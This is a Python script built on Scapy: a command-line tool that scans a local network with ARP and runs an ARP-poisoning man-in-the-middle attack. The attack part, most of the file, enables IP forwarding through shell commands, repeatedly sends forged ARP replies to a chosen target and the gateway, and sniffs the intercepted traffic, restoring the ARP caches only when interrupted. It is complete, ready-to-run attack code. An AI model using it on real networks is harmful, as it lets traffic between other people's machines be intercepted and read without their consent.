from scapy.all import *
from sys import exit, stdout
from threading import Thread

import logging
import argparse
import time
import platform

import globals


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def arp_scan(ip, interface):
    """
    Performs a network scan by sending ARP requests to an IP address or a range of IP addresses.
    Args:
        ip (str): An IP address or IP address range to scan. For example:
                    - 192.168.1.1 to scan a single IP address
                    - 192.168.1.1/24 to scan a range of IP addresses.
    Returns:
        A list of dictionaries mapping IP addresses to MAC addresses. For example:
        [
            {'IP': '192.168.2.1', 'MAC': 'c4:93:d9:8b:3e:5a'}
        ]
    """
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)

    ans, unans = srp(request, timeout=2, retry=1, verbose=0, iface=interface)
    result = []

    for sent, received in ans:
        result.append({'IP': received.psrc, 'MAC': received.hwsrc})

    return result


def arp_spoof(targetIP, spoofIP, spoofMAC):
    """
    Performs an ARP spoofing attack against the target IP.
    Args:
        targetIP (str): An IP address to target.
        spoofIP (str): An IP address to spoof as.
        spoofMAC (str): The spoofed MAC address.
    """
    packet = ARP(op=2, pdst=targetIP, psrc=spoofIP, hwsrc=spoofMAC)
    send(packet, verbose=False)


def arp_restore(destinationIP, sourceIP, destinationMAC, sourceMAC):
    """
    Restores the ARP cache after an ARP spoofing attack.

    Args:
        destinationIP (str): The target IP address.
        sourceIP (str): The IP address of the original host to be restored.
        destinationMAC (str): The target MAC address.
        sourceMAC (str): The MAC address of the original host to be restored.
    """
    packet = ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
    send(packet, count=4, verbose=False)


def set_ip_forwarding(enable):
    """
    Enables IP forwarding through system commands depending on the OS

    Args:
        enable (bool): True if enable, False otherwise.
    """
    enable = int(enable)
    platform_name = platform.system()

    if platform_name == "Linux":
        # Linux
        os.system('echo {} > /proc/sys/net/ipv4/ip_forward'.format(enable))

    elif platform_name == "Darwin":
        # OSX
        os.system('sysctl -w net.inet.ip.forwarding={}'.format(enable))
    # elif platform_name == "Windows":


def sniff_parser(packet):
    if IP in packet:
        print(packet.summary())


def sniffer_thread(callback, filter, iface):
    while not globals.STOP_SNIFF:
        sniff(
            prn=callback,
            filter=filter,
            count=2,
            iface=iface
        )


def arp_mitm(targetIP, gatewayIP, targetMAC, gatewayMAC, myMAC, callback, filter, iface):

    packets = 0

    # Start packet forwarding thread
    print("[+] Packet forwarding enabled.")
    set_ip_forwarding(1)

    print("[+] Starting Packet Sniff.")

    sniffer = Thread(target=sniffer_thread, args=(callback, filter, iface))
    sniffer.start()

    time.sleep(5)

    # Begin ARP MITM attack
    print("[+] ARP MITM attack started.")
    try:
        while True:

            # Tell victim machine that I am the router.
            arp_spoof(targetIP, gatewayIP, myMAC)

            # Tell router that I am the victim machine.
            arp_spoof(gatewayIP, targetIP, myMAC)

            packets += 2
            if packets % 10 == 0:
                print("\r[+] Sent packets " + str(packets)),
            stdout.flush()
            time.sleep(2)

    except KeyboardInterrupt:
        print("[+] Interrupt detected, restoring to original state.")

        # Restore ARP cache
        arp_restore(targetIP, gatewayIP, targetMAC, gatewayMAC)
        arp_restore(gatewayIP, targetIP, gatewayMAC, targetMAC)

        print("[+] Packet forwarding disabled.")
        set_ip_forwarding(0)

        print("[+] Stopping Packet Sniff.")
        globals.STOP_SNIFF = True
        sniffer.join()


def main():

    parser = argparse.ArgumentParser()

    parser.add_argument(
        '-i', '--interface', default=conf.iface, help='Interface to use.'
    )

    subparsers = parser.add_subparsers(
        dest="command", help="Command to perform.", required=True
    )

    discover_subparser = subparsers.add_parser(
        'discover', help='Perform an ARP scan to discover endpoints.'
    )
    discover_subparser.add_argument(
        'IP', help='An IP address (e.g. 192.168.1.1) or address range (e.g. 192.168.1.1/24) to scan.'
    )

    attack_subparser = subparsers.add_parser(
        'attack', help='Perform an ARP poisoning MITM attack.'
    )
    attack_subparser.add_argument(
        'target', help='Target IP address.'
    )
    attack_subparser.add_argument(
        'gateway', help='Gateway IP address.'
    )

    args = parser.parse_args()

    globals.MY_MAC = get_if_hwaddr(args.interface)
    globals.MY_IP = get_if_addr(args.interface)

    print(f"My MAC: {globals.MY_MAC}\nMy IP: {globals.MY_IP}")
    print()

    if args.command == 'discover':
        print(f"[+] Scanning {args.IP}...")
        result = arp_scan(args.IP, args.interface)
        ip_to_MAC = {}

        for mapping in result:
            print(f"\t{mapping['IP']} => {mapping['MAC']}")
            ip_to_MAC[mapping['IP']] = mapping['MAC']

    elif args.command == 'attack':
        print(f"[+] Determining target and gateway MAC address.")

        result = arp_scan(args.target, args.interface)
        if not result:
            print("\tCannot determine target MAC address. Are you sure the IP is correct?")
            exit(1)
        else:
            targetMAC = result[0]['MAC']

        result = arp_scan(args.gateway, args.interface)
        if not result:
            print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
            exit(1)
        else:
            gatewayMAC = result[0]['MAC']

        # Define packet forwarding source and destination
        globals.GATEWAY_MAC = gatewayMAC
        globals._SRC_DST = {
            gatewayMAC: targetMAC,
            targetMAC: gatewayMAC,
        }

        print(f"[+] Performing ARP poisoning MITM.")
        filter = f"ip and (ether src {targetMAC} or ether src {gatewayMAC})"
        arp_mitm(args.target, args.gateway, targetMAC, gatewayMAC, globals.MY_MAC, sniff_parser, filter, args.interface)


if __name__ == '__main__':
    main()
